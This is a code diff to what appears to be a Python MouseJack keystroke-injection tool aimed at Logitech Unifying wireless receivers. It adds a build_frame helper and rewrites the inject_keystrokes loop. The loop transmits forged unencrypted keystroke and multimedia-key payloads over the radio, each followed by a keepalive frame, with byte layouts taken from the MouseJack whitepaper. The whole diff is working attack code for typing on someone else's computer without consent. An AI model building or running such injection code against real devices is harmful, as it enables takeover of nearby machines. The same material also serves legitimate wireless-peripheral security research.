@@ -41,6 +41,13 @@ def multimedia_key_payload(scan_code):
 SET_KEEPALIVE_TIMEOUT_PAYLOAD = with_checksum([0x00, 0x4F, 0x00] + list(TIMEOUT_BYTES) + [0x00, 0x00, 0x00, 0x00]) # refer to Figure 5 in the MouseJack whitepaper: Logitech Unifying Set Keepalive Timeout Payload
 KEEPALIVE_PAYLOAD = with_checksum([0x00, 0x40] + list(TIMEOUT_BYTES)) # refer to Figure 6 in the MouseJack whitepaper: Logitech Unifying Keepalive Payload
 
+def build_frame(scan_code, modifier=KEY_MOD_NONE):
+    """
+    This function receives the scan code and modifier of a keystroke, and returns the proper frame/payload (list of bytes).
+    """
+    if scan_code in multimedia_keys:
+        return multimedia_key_payload(scan_code)
+    return unencrypted_keystroke_payload(scan_code, modifier)
 
 def inject_keystrokes(radio, keystrokes):
     """
@@ -81,13 +88,13 @@ def inject_keystrokes(radio, keystrokes):
                 time.sleep(10 / 1000)
             return
 
-        # if the current keystroke is for a multimedia key or is a key release of a previous multimedia key, then transmit a multimedia key payload
-        if scan_code in multimedia_keys or (scan_code == KEY_RELEASE and is_last_key_multimedia):
+        # special case - if the current keystroke is a key release of a previous multimedia key, then transmit a multimedia key payload
+        if scan_code == KEY_RELEASE and is_last_key_multimedia:
             radio.transmit_payload(multimedia_key_payload(scan_code))
             is_last_key_multimedia = True # update the flag
         else:
-            radio.transmit_payload(unencrypted_keystroke_payload(scan_code, modifier))
-            is_last_key_multimedia = False # update the flag
+            radio.transmit_payload(build_frame(scan_code, modifier)) # transmit the proper frame
+            is_last_key_multimedia = (scan_code in multimedia_keys) # update the flag
         time.sleep(DELAY_BETWEEN_TRANSMISSIONS) # waiting before the next transmission
         radio.transmit_payload(KEEPALIVE_PAYLOAD) # transmitting keepalive after each keystroke
 
